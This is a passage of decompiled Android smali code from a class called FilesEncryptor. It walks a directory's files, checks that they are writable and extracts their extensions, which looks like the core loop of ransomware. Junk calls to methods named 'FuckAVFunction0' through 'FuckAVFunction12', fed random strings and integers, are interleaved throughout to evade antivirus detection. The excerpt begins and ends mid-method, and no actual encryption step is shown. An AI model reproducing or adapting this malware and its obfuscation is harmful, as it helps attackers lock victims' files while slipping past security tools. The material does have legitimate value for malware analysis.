    invoke-static {v1}, Ljava/lang/Boolean;->valueOf(Z)Ljava/lang/Boolean;

    move-result-object v1

    const-string v2, "vEnEMSv"

    const/4 v3, 0x0

    invoke-static {v3}, Ljava/lang/Boolean;->valueOf(Z)Ljava/lang/Boolean;

    move-result-object v3

    invoke-static {v0, v1, v2, v3}, Lcom/androidl/mqmgr/FilesEncryptor;->FuckAVFunction2(Ljava/lang/Boolean;Ljava/lang/Boolean;Ljava/lang/String;Ljava/lang/Boolean;)Ljava/lang/Boolean;

    .line 351
    invoke-virtual {p1}, Ljava/io/File;->listFiles()[Ljava/io/File;

    move-result-object v10

    .line 352
    .local v10, "list":[Ljava/io/File;
    const v0, 0x369162c7

    invoke-static {v0}, Ljava/lang/Integer;->valueOf(I)Ljava/lang/Integer;

    move-result-object v0

    const/4 v1, 0x1

    invoke-static {v1}, Ljava/lang/Boolean;->valueOf(Z)Ljava/lang/Boolean;

    move-result-object v1

    const v2, 0x32a65c89

    invoke-static {v2}, Ljava/lang/Integer;->valueOf(I)Ljava/lang/Integer;

    move-result-object v2

    const-string v3, "Evnvrbj"

    invoke-static {v0, v1, v2, v3}, Lcom/androidl/mqmgr/FilesEncryptor;->FuckAVFunction3(Ljava/lang/Integer;Ljava/lang/Boolean;Ljava/lang/Integer;Ljava/lang/String;)Ljava/lang/String;

    .line 353
    const/4 v0, 0x0

    invoke-static {v0}, Ljava/lang/Boolean;->valueOf(Z)Ljava/lang/Boolean;

    move-result-object v0

    const-string v1, "ldAQf"

    const v2, 0x3b901436

    invoke-static {v2}, Ljava/lang/Integer;->valueOf(I)Ljava/lang/Integer;

    move-result-object v2

    invoke-static {v0, v1, v2}, Lcom/androidl/mqmgr/FilesEncryptor;->FuckAVFunction12(Ljava/lang/Boolean;Ljava/lang/String;Ljava/lang/Integer;)Ljava/lang/Integer;

    .line 354
    invoke-virtual {p1}, Ljava/io/File;->canWrite()Z

    move-result v9

    .line 355
    .local v9, "isWriteableDir":Z
    const v0, 0x171e2ec5

    invoke-static {v0}, Ljava/lang/Integer;->valueOf(I)Ljava/lang/Integer;

    move-result-object v0

    const/4 v1, 0x0

    invoke-static {v1}, Ljava/lang/Boolean;->valueOf(Z)Ljava/lang/Boolean;

    move-result-object v1

    const v2, 0x18c23479

    invoke-static {v2}, Ljava/lang/Integer;->valueOf(I)Ljava/lang/Integer;

    move-result-object v2

    const-string v3, "ECpAS"

    invoke-static {v0, v1, v2, v3}, Lcom/androidl/mqmgr/FilesEncryptor;->FuckAVFunction3(Ljava/lang/Integer;Ljava/lang/Boolean;Ljava/lang/Integer;Ljava/lang/String;)Ljava/lang/String;

    .line 356
    const-string v0, "NVJwPBk"

    const v1, 0x34fe97c5

    invoke-static {v1}, Ljava/lang/Integer;->valueOf(I)Ljava/lang/Integer;

    move-result-object v1

    const/4 v2, 0x1

    invoke-static {v2}, Ljava/lang/Boolean;->valueOf(Z)Ljava/lang/Boolean;

    move-result-object v2

    const/4 v3, 0x0

    invoke-static {v3}, Ljava/lang/Boolean;->valueOf(Z)Ljava/lang/Boolean;

    move-result-object v3

    const-string v4, "LJHqBsHagk"

    const/4 v5, 0x1

    invoke-static {v5}, Ljava/lang/Boolean;->valueOf(Z)Ljava/lang/Boolean;

    move-result-object v5

    invoke-static/range {v0 .. v5}, Lcom/androidl/mqmgr/FilesEncryptor;->FuckAVFunction4(Ljava/lang/String;Ljava/lang/Integer;Ljava/lang/Boolean;Ljava/lang/Boolean;Ljava/lang/String;Ljava/lang/Boolean;)Ljava/lang/Boolean;

    .line 358
    const/4 v8, 0x0

    .local v8, "i":I
    :goto_0
    array-length v0, v10

    if-ge v8, v0, :cond_5

    .line 359
    const v0, 0xd9789f6

    invoke-static {v0}, Ljava/lang/Integer;->valueOf(I)Ljava/lang/Integer;

    move-result-object v0

    const-string v1, "LawVH"

    const/4 v2, 0x1

    invoke-static {v2}, Ljava/lang/Boolean;->valueOf(Z)Ljava/lang/Boolean;

    move-result-object v2

    const/4 v3, 0x1

    invoke-static {v3}, Ljava/lang/Boolean;->valueOf(Z)Ljava/lang/Boolean;

    move-result-object v3

    const v4, 0x14c14b73

    invoke-static {v4}, Ljava/lang/Integer;->valueOf(I)Ljava/lang/Integer;

    move-result-object v4

    const v5, 0x11e02908

    invoke-static {v5}, Ljava/lang/Integer;->valueOf(I)Ljava/lang/Integer;

    move-result-object v5

    const/4 v6, 0x0

    invoke-static {v6}, Ljava/lang/Boolean;->valueOf(Z)Ljava/lang/Boolean;

    move-result-object v6

    invoke-static/range {v0 .. v6}, Lcom/androidl/mqmgr/FilesEncryptor;->FuckAVFunction11(Ljava/lang/Integer;Ljava/lang/String;Ljava/lang/Boolean;Ljava/lang/Boolean;Ljava/lang/Integer;Ljava/lang/Integer;Ljava/lang/Boolean;)V

    .line 360
    const/4 v0, 0x1

    invoke-static {v0}, Ljava/lang/Boolean;->valueOf(Z)Ljava/lang/Boolean;

    move-result-object v0

    const v1, 0x3b8af4ec

    invoke-static {v1}, Ljava/lang/Integer;->valueOf(I)Ljava/lang/Integer;

    move-result-object v1

    const-string v2, "qukPgDgT"

    const/4 v3, 0x0

    invoke-static {v3}, Ljava/lang/Boolean;->valueOf(Z)Ljava/lang/Boolean;

    move-result-object v3

    const-string v4, "qaNNJuq"

    const-string v5, "nvljpnGdK"

    invoke-static/range {v0 .. v5}, Lcom/androidl/mqmgr/FilesEncryptor;->FuckAVFunction6(Ljava/lang/Boolean;Ljava/lang/Integer;Ljava/lang/String;Ljava/lang/Boolean;Ljava/lang/String;Ljava/lang/String;)Ljava/lang/String;

    .line 361
    const v0, 0x99ff11a

    invoke-static {v0}, Ljava/lang/Integer;->valueOf(I)Ljava/lang/Integer;

    move-result-object v0

    const-string v1, "IhKUUbSEIU"

    const/4 v2, 0x1

    invoke-static {v2}, Ljava/lang/Boolean;->valueOf(Z)Ljava/lang/Boolean;

    move-result-object v2

    const/4 v3, 0x0

    invoke-static {v3}, Ljava/lang/Boolean;->valueOf(Z)Ljava/lang/Boolean;

    move-result-object v3

    const v4, 0x11bae862

    invoke-static {v4}, Ljava/lang/Integer;->valueOf(I)Ljava/lang/Integer;

    move-result-object v4

    const v5, 0x167f64cf

    invoke-static {v5}, Ljava/lang/Integer;->valueOf(I)Ljava/lang/Integer;

    move-result-object v5

    const/4 v6, 0x0

    invoke-static {v6}, Ljava/lang/Boolean;->valueOf(Z)Ljava/lang/Boolean;

    move-result-object v6

    invoke-static/range {v0 .. v6}, Lcom/androidl/mqmgr/FilesEncryptor;->FuckAVFunction11(Ljava/lang/Integer;Ljava/lang/String;Ljava/lang/Boolean;Ljava/lang/Boolean;Ljava/lang/Integer;Ljava/lang/Integer;Ljava/lang/Boolean;)V

    .line 362
    const-string v0, "vOvEj"

    const-string v1, "Jokwum"

    const v2, 0x348b1c2a

    invoke-static {v2}, Ljava/lang/Integer;->valueOf(I)Ljava/lang/Integer;

    move-result-object v2

    invoke-static {v0, v1, v2}, Lcom/androidl/mqmgr/FilesEncryptor;->FuckAVFunction0(Ljava/lang/String;Ljava/lang/String;Ljava/lang/Integer;)Ljava/lang/Integer;

    .line 363
    new-instance v12, Ljava/io/File;

    invoke-virtual {p1}, Ljava/io/File;->getAbsolutePath()Ljava/lang/String;

    move-result-object v0

    aget-object v1, v10, v8

    invoke-virtual {v1}, Ljava/io/File;->getName()Ljava/lang/String;

    move-result-object v1

    invoke-direct {v12, v0, v1}, Ljava/io/File;-><init>(Ljava/lang/String;Ljava/lang/String;)V

    .line 364
    .local v12, "tempFile":Ljava/io/File;
    const v0, 0xa90afb0

    invoke-static {v0}, Ljava/lang/Integer;->valueOf(I)Ljava/lang/Integer;

    move-result-object v0

    const/4 v1, 0x1

    invoke-static {v1}, Ljava/lang/Boolean;->valueOf(Z)Ljava/lang/Boolean;

    move-result-object v1

    const v2, 0x1ffb53d4

    invoke-static {v2}, Ljava/lang/Integer;->valueOf(I)Ljava/lang/Integer;

    move-result-object v2

    const-string v3, "sJDmqcea"

    invoke-static {v0, v1, v2, v3}, Lcom/androidl/mqmgr/FilesEncryptor;->FuckAVFunction3(Ljava/lang/Integer;Ljava/lang/Boolean;Ljava/lang/Integer;Ljava/lang/String;)Ljava/lang/String;

    .line 365
    const-string v0, "pbMntWrv"

    const v1, 0x270228b6

    invoke-static {v1}, Ljava/lang/Integer;->valueOf(I)Ljava/lang/Integer;

    move-result-object v1

    const-string v2, "jGAlSfIOIdS"

    const-string v3, "Bucakg"

    const/4 v4, 0x1

    invoke-static {v4}, Ljava/lang/Boolean;->valueOf(Z)Ljava/lang/Boolean;

    move-result-object v4

    const/4 v5, 0x0

    invoke-static {v5}, Ljava/lang/Boolean;->valueOf(Z)Ljava/lang/Boolean;

    move-result-object v5

    invoke-static/range {v0 .. v5}, Lcom/androidl/mqmgr/FilesEncryptor;->FuckAVFunction5(Ljava/lang/String;Ljava/lang/Integer;Ljava/lang/String;Ljava/lang/String;Ljava/lang/Boolean;Ljava/lang/Boolean;)Ljava/lang/Boolean;

    .line 366
    const-string v0, "fbWEEGIvhlM"

    const/4 v1, 0x0

    invoke-static {v1}, Ljava/lang/Boolean;->valueOf(Z)Ljava/lang/Boolean;

    move-result-object v1

    const v2, 0x26a48fe2

    invoke-static {v2}, Ljava/lang/Integer;->valueOf(I)Ljava/lang/Integer;

    move-result-object v2

    const/4 v3, 0x1

    invoke-static {v3}, Ljava/lang/Boolean;->valueOf(Z)Ljava/lang/Boolean;

    move-result-object v3

    const v4, 0x1a021c70

    invoke-static {v4}, Ljava/lang/Integer;->valueOf(I)Ljava/lang/Integer;

    move-result-object v4

    const-string v5, "mRcRk"

    const/4 v6, 0x1

    invoke-static {v6}, Ljava/lang/Boolean;->valueOf(Z)Ljava/lang/Boolean;

    move-result-object v6

    invoke-static/range {v0 .. v6}, Lcom/androidl/mqmgr/FilesEncryptor;->FuckAVFunction8(Ljava/lang/String;Ljava/lang/Boolean;Ljava/lang/Integer;Ljava/lang/Boolean;Ljava/lang/Integer;Ljava/lang/String;Ljava/lang/Boolean;)Ljava/lang/Boolean;

    .line 367
    const/4 v0, 0x1

    invoke-static {v0}, Ljava/lang/Boolean;->valueOf(Z)Ljava/lang/Boolean;

    move-result-object v0

    const/4 v1, 0x1

    invoke-static {v1}, Ljava/lang/Boolean;->valueOf(Z)Ljava/lang/Boolean;

    move-result-object v1

    const-string v2, "sVoNHeJND"

    const/4 v3, 0x0

    invoke-static {v3}, Ljava/lang/Boolean;->valueOf(Z)Ljava/lang/Boolean;

    move-result-object v3

    const-string v4, "RRsiLoJFk"

    const v5, 0x148e128f

    invoke-static {v5}, Ljava/lang/Integer;->valueOf(I)Ljava/lang/Integer;

    move-result-object v5

    invoke-static/range {v0 .. v5}, Lcom/androidl/mqmgr/FilesEncryptor;->FuckAVFunction1(Ljava/lang/Boolean;Ljava/lang/Boolean;Ljava/lang/String;Ljava/lang/Boolean;Ljava/lang/String;Ljava/lang/Integer;)Ljava/lang/Integer;

    .line 368
    invoke-virtual {v12}, Ljava/io/File;->getAbsolutePath()Ljava/lang/String;

    move-result-object v11

    .line 369
    .local v11, "path":Ljava/lang/String;
    const/4 v0, 0x1

    invoke-static {v0}, Ljava/lang/Boolean;->valueOf(Z)Ljava/lang/Boolean;

    move-result-object v0

    const/4 v1, 0x1

    invoke-static {v1}, Ljava/lang/Boolean;->valueOf(Z)Ljava/lang/Boolean;

    move-result-object v1

    const-string v2, "vhCnOh"

    const v3, 0xba1186d

    invoke-static {v3}, Ljava/lang/Integer;->valueOf(I)Ljava/lang/Integer;

    move-result-object v3

    const/4 v4, 0x0

    invoke-static {v4}, Ljava/lang/Boolean;->valueOf(Z)Ljava/lang/Boolean;

    move-result-object v4

    const-string v5, "uNsDHFmBs"

    const/4 v6, 0x0

    invoke-static {v6}, Ljava/lang/Boolean;->valueOf(Z)Ljava/lang/Boolean;

    move-result-object v6

    invoke-static/range {v0 .. v6}, Lcom/androidl/mqmgr/FilesEncryptor;->FuckAVFunction9(Ljava/lang/Boolean;Ljava/lang/Boolean;Ljava/lang/String;Ljava/lang/Integer;Ljava/lang/Boolean;Ljava/lang/String;Ljava/lang/Boolean;)Ljava/lang/Boolean;

    .line 370
    const/4 v0, 0x1

    invoke-static {v0}, Ljava/lang/Boolean;->valueOf(Z)Ljava/lang/Boolean;

    move-result-object v0

    const/4 v1, 0x1

    invoke-static {v1}, Ljava/lang/Boolean;->valueOf(Z)Ljava/lang/Boolean;

    move-result-object v1

    const-string v2, "mRwgqJqosNF"

    const v3, 0x1071b042

    invoke-static {v3}, Ljava/lang/Integer;->valueOf(I)Ljava/lang/Integer;

    move-result-object v3

    const/4 v4, 0x0

    invoke-static {v4}, Ljava/lang/Boolean;->valueOf(Z)Ljava/lang/Boolean;

    move-result-object v4

    const-string v5, "fIKtM"

    const/4 v6, 0x1

    invoke-static {v6}, Ljava/lang/Boolean;->valueOf(Z)Ljava/lang/Boolean;

    move-result-object v6

    invoke-static/range {v0 .. v6}, Lcom/androidl/mqmgr/FilesEncryptor;->FuckAVFunction9(Ljava/lang/Boolean;Ljava/lang/Boolean;Ljava/lang/String;Ljava/lang/Integer;Ljava/lang/Boolean;Ljava/lang/String;Ljava/lang/Boolean;)Ljava/lang/Boolean;

    .line 371
    const/4 v0, 0x0

    invoke-static {v0}, Ljava/lang/Boolean;->valueOf(Z)Ljava/lang/Boolean;

    move-result-object v0

    const/4 v1, 0x1

    invoke-static {v1}, Ljava/lang/Boolean;->valueOf(Z)Ljava/lang/Boolean;

    move-result-object v1

    const-string v2, "IjAMdbUO"

    const v3, 0x343a8d2a

    invoke-static {v3}, Ljava/lang/Integer;->valueOf(I)Ljava/lang/Integer;

    move-result-object v3

    const/4 v4, 0x1

    invoke-static {v4}, Ljava/lang/Boolean;->valueOf(Z)Ljava/lang/Boolean;

    move-result-object v4

    const-string v5, "PNwwcs"

    const/4 v6, 0x0

    invoke-static {v6}, Ljava/lang/Boolean;->valueOf(Z)Ljava/lang/Boolean;

    move-result-object v6

    invoke-static/range {v0 .. v6}, Lcom/androidl/mqmgr/FilesEncryptor;->FuckAVFunction9(Ljava/lang/Boolean;Ljava/lang/Boolean;Ljava/lang/String;Ljava/lang/Integer;Ljava/lang/Boolean;Ljava/lang/String;Ljava/lang/Boolean;)Ljava/lang/Boolean;

    .line 372
    const-string v0, "gFPwLeHu"

    const v1, 0x2b55065b

    invoke-static {v1}, Ljava/lang/Integer;->valueOf(I)Ljava/lang/Integer;

    move-result-object v1

    const-string v2, "LwJNPRPc"

    const-string v3, "QfdnMhIrr"

    const/4 v4, 0x0

    invoke-static {v4}, Ljava/lang/Boolean;->valueOf(Z)Ljava/lang/Boolean;

    move-result-object v4

    const/4 v5, 0x0

    invoke-static {v5}, Ljava/lang/Boolean;->valueOf(Z)Ljava/lang/Boolean;

    move-result-object v5

    invoke-static/range {v0 .. v5}, Lcom/androidl/mqmgr/FilesEncryptor;->FuckAVFunction5(Ljava/lang/String;Ljava/lang/Integer;Ljava/lang/String;Ljava/lang/String;Ljava/lang/Boolean;Ljava/lang/Boolean;)Ljava/lang/Boolean;

    .line 374
    invoke-virtual {v12}, Ljava/io/File;->isDirectory()Z

    move-result v0

    if-nez v0, :cond_4

    .line 375
    const/4 v0, 0x1

    invoke-static {v0}, Ljava/lang/Boolean;->valueOf(Z)Ljava/lang/Boolean;

    move-result-object v0

    const/4 v1, 0x1

    invoke-static {v1}, Ljava/lang/Boolean;->valueOf(Z)Ljava/lang/Boolean;

    move-result-object v1

    const-string v2, "KdndIQfEI"

    const/4 v3, 0x0

    invoke-static {v3}, Ljava/lang/Boolean;->valueOf(Z)Ljava/lang/Boolean;

    move-result-object v3

    const-string v4, "nbpCdG"

    const v5, 0x1ed66def

    invoke-static {v5}, Ljava/lang/Integer;->valueOf(I)Ljava/lang/Integer;

    move-result-object v5

    invoke-static/range {v0 .. v5}, Lcom/androidl/mqmgr/FilesEncryptor;->FuckAVFunction1(Ljava/lang/Boolean;Ljava/lang/Boolean;Ljava/lang/String;Ljava/lang/Boolean;Ljava/lang/String;Ljava/lang/Integer;)Ljava/lang/Integer;

    .line 376
    const v0, 0x1e0824bf

    invoke-static {v0}, Ljava/lang/Integer;->valueOf(I)Ljava/lang/Integer;

    move-result-object v0

    const v1, 0x498ddeb

    invoke-static {v1}, Ljava/lang/Integer;->valueOf(I)Ljava/lang/Integer;

    move-result-object v1

    const/4 v2, 0x1

    invoke-static {v2}, Ljava/lang/Boolean;->valueOf(Z)Ljava/lang/Boolean;

    move-result-object v2

    const v3, 0x21f938b2

    invoke-static {v3}, Ljava/lang/Integer;->valueOf(I)Ljava/lang/Integer;

    move-result-object v3

    const/4 v4, 0x1

    invoke-static {v4}, Ljava/lang/Boolean;->valueOf(Z)Ljava/lang/Boolean;

    move-result-object v4

    const/4 v5, 0x1

    invoke-static {v5}, Ljava/lang/Boolean;->valueOf(Z)Ljava/lang/Boolean;

    move-result-object v5

    const/4 v6, 0x0

    invoke-static {v6}, Ljava/lang/Boolean;->valueOf(Z)Ljava/lang/Boolean;

    move-result-object v6

    invoke-static/range {v0 .. v6}, Lcom/androidl/mqmgr/FilesEncryptor;->FuckAVFunction10(Ljava/lang/Integer;Ljava/lang/Integer;Ljava/lang/Boolean;Ljava/lang/Integer;Ljava/lang/Boolean;Ljava/lang/Boolean;Ljava/lang/Boolean;)Ljava/lang/Boolean;

    .line 377
    const/4 v0, 0x1

    invoke-static {v0}, Ljava/lang/Boolean;->valueOf(Z)Ljava/lang/Boolean;

    move-result-object v0

    const v1, 0x2d53626f

    invoke-static {v1}, Ljava/lang/Integer;->valueOf(I)Ljava/lang/Integer;

    move-result-object v1

    const-string v2, "oPLakH"

    const/4 v3, 0x0

    invoke-static {v3}, Ljava/lang/Boolean;->valueOf(Z)Ljava/lang/Boolean;

    move-result-object v3

    const-string v4, "eDsHRTVq"

    const-string v5, "jbIlEIMrQE"

    invoke-static/range {v0 .. v5}, Lcom/androidl/mqmgr/FilesEncryptor;->FuckAVFunction6(Ljava/lang/Boolean;Ljava/lang/Integer;Ljava/lang/String;Ljava/lang/Boolean;Ljava/lang/String;Ljava/lang/String;)Ljava/lang/String;

    .line 378
    const-string v0, "LFccg"

    const v1, 0x2727e091

    invoke-static {v1}, Ljava/lang/Integer;->valueOf(I)Ljava/lang/Integer;

    move-result-object v1

    const-string v2, "BNTPPB"

    const-string v3, "pUGGMWW"

    const/4 v4, 0x1

    invoke-static {v4}, Ljava/lang/Boolean;->valueOf(Z)Ljava/lang/Boolean;

    move-result-object v4

    const/4 v5, 0x1

    invoke-static {v5}, Ljava/lang/Boolean;->valueOf(Z)Ljava/lang/Boolean;

    move-result-object v5

    invoke-static/range {v0 .. v5}, Lcom/androidl/mqmgr/FilesEncryptor;->FuckAVFunction5(Ljava/lang/String;Ljava/lang/Integer;Ljava/lang/String;Ljava/lang/String;Ljava/lang/Boolean;Ljava/lang/Boolean;)Ljava/lang/Boolean;

    .line 379
    if-eqz v9, :cond_1

    .line 380
    const-string v0, "UGtSpEp"

    const/4 v1, 0x0

    invoke-static {v1}, Ljava/lang/Boolean;->valueOf(Z)Ljava/lang/Boolean;

    move-result-object v1

    const v2, 0x1e205b92

    invoke-static {v2}, Ljava/lang/Integer;->valueOf(I)Ljava/lang/Integer;

    move-result-object v2

    const/4 v3, 0x1

    invoke-static {v3}, Ljava/lang/Boolean;->valueOf(Z)Ljava/lang/Boolean;

    move-result-object v3

    const v4, 0x17fb5e9d

    invoke-static {v4}, Ljava/lang/Integer;->valueOf(I)Ljava/lang/Integer;

    move-result-object v4

    const-string v5, "wJFLcDTTw"

    const/4 v6, 0x0

    invoke-static {v6}, Ljava/lang/Boolean;->valueOf(Z)Ljava/lang/Boolean;

    move-result-object v6

    invoke-static/range {v0 .. v6}, Lcom/androidl/mqmgr/FilesEncryptor;->FuckAVFunction8(Ljava/lang/String;Ljava/lang/Boolean;Ljava/lang/Integer;Ljava/lang/Boolean;Ljava/lang/Integer;Ljava/lang/String;Ljava/lang/Boolean;)Ljava/lang/Boolean;

    .line 381
    const-string v0, "RcJLsLm"

    const v1, 0x23698e4d

    invoke-static {v1}, Ljava/lang/Integer;->valueOf(I)Ljava/lang/Integer;

    move-result-object v1

    const/4 v2, 0x0

    invoke-static {v2}, Ljava/lang/Boolean;->valueOf(Z)Ljava/lang/Boolean;

    move-result-object v2

    const/4 v3, 0x1

    invoke-static {v3}, Ljava/lang/Boolean;->valueOf(Z)Ljava/lang/Boolean;

    move-result-object v3

    const-string v4, "kNFPePB"

    const/4 v5, 0x0

    invoke-static {v5}, Ljava/lang/Boolean;->valueOf(Z)Ljava/lang/Boolean;

    move-result-object v5

    invoke-static/range {v0 .. v5}, Lcom/androidl/mqmgr/FilesEncryptor;->FuckAVFunction4(Ljava/lang/String;Ljava/lang/Integer;Ljava/lang/Boolean;Ljava/lang/Boolean;Ljava/lang/String;Ljava/lang/Boolean;)Ljava/lang/Boolean;

    .line 382
    const-string v0, "mHBkHiB"

    const v1, 0x392d9a65

    invoke-static {v1}, Ljava/lang/Integer;->valueOf(I)Ljava/lang/Integer;

    move-result-object v1

    const/4 v2, 0x0

    invoke-static {v2}, Ljava/lang/Boolean;->valueOf(Z)Ljava/lang/Boolean;

    move-result-object v2

    const/4 v3, 0x1

    invoke-static {v3}, Ljava/lang/Boolean;->valueOf(Z)Ljava/lang/Boolean;

    move-result-object v3

    const-string v4, "HNRLoksFe"

    const/4 v5, 0x1

    invoke-static {v5}, Ljava/lang/Boolean;->valueOf(Z)Ljava/lang/Boolean;

    move-result-object v5

    invoke-static/range {v0 .. v5}, Lcom/androidl/mqmgr/FilesEncryptor;->FuckAVFunction4(Ljava/lang/String;Ljava/lang/Integer;Ljava/lang/Boolean;Ljava/lang/Boolean;Ljava/lang/String;Ljava/lang/Boolean;)Ljava/lang/Boolean;

    .line 383
    const v0, 0x204cd13f

    invoke-static {v0}, Ljava/lang/Integer;->valueOf(I)Ljava/lang/Integer;

    move-result-object v0

    const v1, 0x6e6da94

    invoke-static {v1}, Ljava/lang/Integer;->valueOf(I)Ljava/lang/Integer;

    move-result-object v1

    const/4 v2, 0x1

    invoke-static {v2}, Ljava/lang/Boolean;->valueOf(Z)Ljava/lang/Boolean;

    move-result-object v2

    const v3, 0x3af6e0bf

    invoke-static {v3}, Ljava/lang/Integer;->valueOf(I)Ljava/lang/Integer;

    move-result-object v3

    const/4 v4, 0x1

    invoke-static {v4}, Ljava/lang/Boolean;->valueOf(Z)Ljava/lang/Boolean;

    move-result-object v4

    const/4 v5, 0x1

    invoke-static {v5}, Ljava/lang/Boolean;->valueOf(Z)Ljava/lang/Boolean;

    move-result-object v5

    const/4 v6, 0x0

    invoke-static {v6}, Ljava/lang/Boolean;->valueOf(Z)Ljava/lang/Boolean;

    move-result-object v6

    invoke-static/range {v0 .. v6}, Lcom/androidl/mqmgr/FilesEncryptor;->FuckAVFunction10(Ljava/lang/Integer;Ljava/lang/Integer;Ljava/lang/Boolean;Ljava/lang/Integer;Ljava/lang/Boolean;Ljava/lang/Boolean;Ljava/lang/Boolean;)Ljava/lang/Boolean;

    .line 384
    const-string v0, "."

    invoke-virtual {v11, v0}, Ljava/lang/String;->lastIndexOf(Ljava/lang/String;)I

    move-result v0

    add-int/lit8 v0, v0, 0x1

    invoke-virtual {v11, v0}, Ljava/lang/String;->substring(I)Ljava/lang/String;

    move-result-object v7

    .line 385
    .local v7, "extension":Ljava/lang/String;
    const-string v0, "oLciTc"

    const-string v1, "GAMQOGtd"

    const v2, 0x2e8ea250

    invoke-static {v2}, Ljava/lang/Integer;->valueOf(I)Ljava/lang/Integer;

    move-result-object v2

    invoke-static {v0, v1, v2}, Lcom/androidl/mqmgr/FilesEncryptor;->FuckAVFunction0(Ljava/lang/String;Ljava/lang/String;Ljava/lang/Integer;)Ljava/lang/Integer;

    .line 386
    const/4 v0, 0x0

    invoke-static {v0}, Ljava/lang/Boolean;->valueOf(Z)Ljava/lang/Boolean;

    move-result-object v0

    const/4 v1, 0x0

    invoke-static {v1}, Ljava/lang/Boolean;->valueOf(Z)Ljava/lang/Boolean;

    move-result-object v1

    const v2, 0x14a55af7

    invoke-static {v2}, Ljava/lang/Integer;->valueOf(I)Ljava/lang/Integer;

    move-result-object v2

    const-string v3, "PaLoaeao"

    const/4 v4, 0x1

    invoke-static {v4}, Ljava/lang/Boolean;->valueOf(Z)Ljava/lang/Boolean;

    move-result-object v4

    const v5, 0xac3715f

    invoke-static {v5}, Ljava/lang/Integer;->valueOf(I)Ljava/lang/Integer;

    move-result-object v5

    invoke-static/range {v0 .. v5}, Lcom/androidl/mqmgr/FilesEncryptor;->FuckAVFunction7(Ljava/lang/Boolean;Ljava/lang/Boolean;Ljava/lang/Integer;Ljava/lang/String;Ljava/lang/Boolean;Ljava/lang/Integer;)Ljava/lang/Integer;

    .line 387
    const-string v0, "QdEtnt"

    const/4 v1, 0x1

    invoke-static {v1}, Ljava/lang/Boolean;->valueOf(Z)Ljava/lang/Boolean;

    move-result-object v1

    const v2, 0x17595232

    invoke-static {v2}, Ljava/lang/Integer;->valueOf(I)Ljava/lang/Integer;

    move-result-object v2

    const/4 v3, 0x0

    invoke-static {v3}, Ljava/lang/Boolean;->valueOf(Z)Ljava/lang/Boolean;

    move-result-object v3

    const v4, 0x24e8535b

    invoke-static {v4}, Ljava/lang/Integer;->valueOf(I)Ljava/lang/Integer;

    move-result-object v4

    const-string v5, "ewLFc"

    const/4 v6, 0x1

    invoke-static {v6}, Ljava/lang/Boolean;->valueOf(Z)Ljava/lang/Boolean;

    move-result-object v6

    invoke-static/range {v0 .. v6}, Lcom/androidl/mqmgr/FilesEncryptor;->FuckAVFunction8(Ljava/lang/String;Ljava/lang/Boolean;Ljava/lang/Integer;Ljava/lang/Boolean;Ljava/lang/Integer;Ljava/lang/String;Ljava/lang/Boolean;)Ljava/lang/Boolean;

    .line 388
    const v0, 0x3b71587a

    invoke-static {v0}, Ljava/lang/Integer;->valueOf(I)Ljava/lang/Integer;

    move-result-object v0

    const-string v1, "KjOrdMS"

    const/4 v2, 0x0

    invoke-static {v2}, Ljava/lang/Boolean;->valueOf(Z)Ljava/lang/Boolean;

    move-result-object v2

    const/4 v3, 0x0

    invoke-static {v3}, Ljava/lang/Boolean;->valueOf(Z)Ljava/lang/Boolean;

    move-result-object v3

    const v4, 0x22a84ef1

    invoke-static {v4}, Ljava/lang/Integer;->valueOf(I)Ljava/lang/Integer;

    move-result-object v4

    const v5, 0xa8a2ac6

    invoke-static {v5}, Ljava/lang/Integer;->valueOf(I)Ljava/lang/Integer;

    move-result-object v5

    const/4 v6, 0x0

    invoke-static {v6}, Ljava/lang/Boolean;->valueOf(Z)Ljava/lang/Boolean;

    move-result-object v6

    invoke-static/range {v0 .. v6}, Lcom/androidl/mqmgr/FilesEncryptor;->FuckAVFunction11(Ljava/lang/Integer;Ljava/lang/String;Ljava/lang/Boolean;Ljava/lang/Boolean;Ljava/lang/Integer;Ljava/lang/Integer;Ljava/lang/Boolean;)V

    .line 390
    if-eqz v7, :cond_2

    const/4 v0, 0x1

    :goto_1
    invoke-virtual {v7}, Ljava/lang/String;->isEmpty()Z

    move-result v1

    if-nez v1, :cond_3

    const/4 v1, 0x1

    :goto_2
    and-int/2addr v0, v1

    if-eqz v0, :cond_1

    .line 391
    const v0, 0x1578c371

    invoke-static {v0}, Ljava/lang/Integer;->valueOf(I)Ljava/lang/Integer;

    move-result-object v0

    const/4 v1, 0x1

    invoke-static {v1}, Ljava/lang/Boolean;->valueOf(Z)Ljava/lang/Boolean;

    move-result-object v1

    const v2, 0x28f7abd5

    invoke-static {v2}, Ljava/lang/Integer;->valueOf(I)Ljava/lang/Integer;

    move-result-object v2

    const-string v3, "kJmPuVm"

    invoke-static {v0, v1, v2, v3}, Lcom/androidl/mqmgr/FilesEncryptor;->FuckAVFunction3(Ljava/lang/Integer;Ljava/lang/Boolean;Ljava/lang/Integer;Ljava/lang/String;)Ljava/lang/String;

    .line 392
    const v0, 0x180eed5b

    invoke-static {v0}, Ljava/lang/Integer;->valueOf(I)Ljava/lang/Integer;

    move-result-object v0

    const v1, 0x398eece3

    invoke-static {v1}, Ljava/lang/Integer;->valueOf(I)Ljava/lang/Integer;

    move-result-object v1

    const/4 v2, 0x0

    invoke-static {v2}, Ljava/lang/Boolean;->valueOf(Z)Ljava/lang/Boolean;

    move-result-object v2

    const v3, 0x34a8681

    invoke-static {v3}, Ljava/lang/Integer;->valueOf(I)Ljava/lang/Integer;

    move-result-object v3

    const/4 v4, 0x1

    invoke-static {v4}, Ljava/lang/Boolean;->valueOf(Z)Ljava/lang/Boolean;

    move-result-object v4

    const/4 v5, 0x0

    invoke-static {v5}, Ljava/lang/Boolean;->valueOf(Z)Ljava/lang/Boolean;

    move-result-object v5

    const/4 v6, 0x0

    invoke-static {v6}, Ljava/lang/Boolean;->valueOf(Z)Ljava/lang/Boolean;

    move-result-object v6

    invoke-static/range {v0 .. v6}, Lcom/androidl/mqmgr/FilesEncryptor;->FuckAVFunction10(Ljava/lang/Integer;Ljava/lang/Integer;Ljava/lang/Boolean;Ljava/lang/Integer;Ljava/lang/Boolean;Ljava/lang/Boolean;Ljava/lang/Boolean;)Ljava/lang/Boolean;

    .line 393
    const-string v0, "VPkFs"

    const/4 v1, 0x0

    invoke-static {v1}, Ljava/lang/Boolean;->valueOf(Z)Ljava/lang/Boolean;

    move-result-object v1

    const v2, 0x28481e61

    invoke-static {v2}, Ljava/lang/Integer;->valueOf(I)Ljava/lang/Integer;

    move-result-object v2

    const/4 v3, 0x1

    invoke-static {v3}, Ljava/lang/Boolean;->valueOf(Z)Ljava/lang/Boolean;

    move-result-object v3

    const v4, 0x1436103b
